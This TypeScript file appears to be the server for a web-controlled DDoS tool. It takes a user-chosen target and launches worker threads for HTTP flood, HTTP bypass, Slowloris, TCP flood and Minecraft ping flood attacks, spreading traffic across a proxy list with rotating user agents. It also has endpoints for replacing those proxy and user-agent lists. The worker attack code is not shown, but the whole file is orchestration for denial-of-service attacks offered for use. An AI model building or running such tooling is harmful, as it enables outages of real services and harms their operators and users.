import express from "express";
import { readFileSync, writeFileSync } from "fs";
import { createServer } from "http";
import { dirname, join } from "path";
import { Server } from "socket.io";
import { fileURLToPath } from "url";
import { Worker } from "worker_threads";
import helmet from "helmet";
import compression from "compression";
import cors from "cors";
import rateLimit from "express-rate-limit";

import bodyParser from "body-parser";
import { currentPath, loadProxies, loadUserAgents } from "./fileLoader";
import { AttackMethod } from "./lib";
import { filterProxies } from "./proxyUtils";

// Define the workers based on attack type
const attackWorkers: { [key in AttackMethod]: string } = {
  http_flood: "./workers/httpFloodAttack.js",
  http_bypass: "./workers/httpBypassAttack.js",
  http_slowloris: "./workers/httpSlowlorisAttack.js",
  tcp_flood: "./workers/tcpFloodAttack.js",
  minecraft_ping: "./workers/minecraftPingAttack.js",
};

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const __prod = process.env['NODE_ENV'] === "production";

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: __prod ? "" : "http://localhost:5173",
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"],
    credentials: true
  },
  transports: ['websocket', 'polling']
});

// Security middleware
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
}));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});

app.use(limiter);

// CORS configuration
app.use(cors({
  origin: __prod ? false : "http://localhost:5173",
  credentials: true,
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// Compression middleware
app.use(compression());

// Body parser middleware
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

// Static files
app.use(express.static(join(__dirname, "public")));

// Error handling middleware
app.use((err: Error, _req: express.Request, res: express.Response, _next: express.NextFunction) => {
  console.error('Error:', err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

// Health check endpoint
app.get('/health', (_req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

const proxies = loadProxies();
const userAgents = loadUserAgents();

console.log(`🚀 Server starting up...`);
console.log(`📊 Proxies loaded: ${proxies.length}`);
console.log(`👤 User agents loaded: ${userAgents.length}`);

// Socket.IO connection handling
io.on("connection", (socket) => {
  console.log(`🔌 Client connected: ${socket.id}`);

  // Send initial stats
  socket.emit("stats", {
    pps: 0,
    bots: proxies.length,
    totalPackets: 0,
    log: "🍤 Connected to the server.",
    timestamp: new Date().toISOString()
  });

  socket.on("startAttack", (params) => {
    try {
      const { target, duration, packetDelay, attackMethod, packetSize } = params;
      
      // Validate parameters
      if (!target || !attackMethod) {
        socket.emit("stats", {
          log: "❌ Missing required parameters: target and attackMethod",
          error: true
        });
        return;
      }

      const filteredProxies = filterProxies(proxies, attackMethod);
      const attackWorkerFile = attackWorkers[attackMethod as AttackMethod];

      if (!attackWorkerFile) {
        socket.emit("stats", {
          log: `❌ Unsupported attack type: ${attackMethod}`,
          error: true
        });
        return;
      }

      console.log(`🎯 Starting attack: ${attackMethod} on ${target}`);

      socket.emit("stats", {
        log: `🍒 Using ${filteredProxies.length} filtered proxies to perform attack.`,
        bots: filteredProxies.length,
        attackStarted: true
      });

      const worker = new Worker(join(__dirname, attackWorkerFile), {
        workerData: {
          target,
          proxies: filteredProxies,
          userAgents,
          duration,
          packetDelay,
          packetSize,
        },
      });

      worker.on("message", (message) => {
        socket.emit("stats", {
          ...message,
          timestamp: new Date().toISOString()
        });
      });

      worker.on("error", (error) => {
        console.error(`❌ Worker error: ${error.message}`);
        socket.emit("stats", { 
          log: `❌ Worker error: ${error.message}`,
          error: true
        });
      });

      worker.on("exit", (code) => {
        console.log(`🏁 Worker exited with code ${code}`);
        socket.emit("attackEnd", { code, timestamp: new Date().toISOString() });
      });

      // Store worker reference
      socket.data.worker = worker;
      
    } catch (error) {
      console.error('Error starting attack:', error);
      socket.emit("stats", {
        log: `❌ Failed to start attack: ${error instanceof Error ? error.message : 'Unknown error'}`,
        error: true
      });
    }
  });

  socket.on("stopAttack", () => {
    try {
      const worker = socket.data.worker;
      if (worker) {
        worker.terminate();
        console.log(`🛑 Attack stopped by user: ${socket.id}`);
        socket.emit("attackEnd", { 
          stopped: true, 
          timestamp: new Date().toISOString() 
        });
      }
    } catch (error) {
      console.error('Error stopping attack:', error);
    }
  });

  socket.on("disconnect", () => {
    try {
      const worker = socket.data.worker;
      if (worker) {
        worker.terminate();
        console.log(`🔄 Worker terminated due to disconnect: ${socket.id}`);
      }
      console.log(`🔌 Client disconnected: ${socket.id}`);
    } catch (error) {
      console.error('Error during disconnect:', error);
    }
  });
});

// Configuration endpoints
app.get("/configuration", (_req, res) => {
  try {
    const proxiesText = readFileSync(
      join(currentPath(), "data", "proxies.txt"),
      "utf-8"
    );
    const uasText = readFileSync(join(currentPath(), "data", "uas.txt"), "utf-8");

    res.json({
      proxies: btoa(proxiesText),
      uas: btoa(uasText),
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('Error reading configuration:', error);
    res.status(500).json({ error: 'Failed to read configuration' });
  }
});

app.post("/configuration", (req, res) => {
  try {
    const { proxies: proxiesData, uas: uasData } = req.body;
    
    if (!proxiesData || !uasData) {
      res.status(400).json({ error: 'Missing proxies or uas data' });
      return;
    }

    // atob and btoa are used to avoid the problems in sending data with // characters, etc.
    const proxies = atob(proxiesData);
    const uas = atob(uasData);
    
    writeFileSync(join(currentPath(), "data", "proxies.txt"), proxies, {
      encoding: "utf-8",
    });
    writeFileSync(join(currentPath(), "data", "uas.txt"), uas, {
      encoding: "utf-8",
    });

    console.log('✅ Configuration updated successfully');
    res.json({ message: 'Configuration updated successfully' });
  } catch (error) {
    console.error('Error updating configuration:', error);
    res.status(500).json({ error: 'Failed to update configuration' });
  }
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('🔄 SIGTERM received, shutting down gracefully...');
  httpServer.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('🔄 SIGINT received, shutting down gracefully...');
  httpServer.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});

const PORT = parseInt(process.env['PORT'] || "3000");
httpServer.listen(PORT, () => {
  if (__prod) {
    console.log(
      `🚀 (Production Mode) Client and server running on http://localhost:${PORT}`
    );
  } else {
    console.log(`🔧 Development server running on port ${PORT}`);
  }
      console.log(`📊 Environment: ${process.env['NODE_ENV'] || 'development'}`);
});
